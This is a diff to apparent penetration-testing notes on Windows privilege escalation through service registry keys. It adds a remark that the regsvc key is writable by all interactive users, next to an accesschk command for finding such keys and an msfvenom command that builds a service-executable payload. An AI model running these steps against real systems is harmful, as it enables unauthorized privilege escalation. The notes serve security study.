@@ -232,6 +232,9 @@ Windows stores all the necessary data that is related to services in the registr
 
  * Find from which group is accessible this service
     * accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\\\<servicename>
+    
+    * found if note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users).
+
  
  * generate a payload:
    * msfvenom –p windows/exec CMD=\<Command> -f exe-services –o \<service binery>
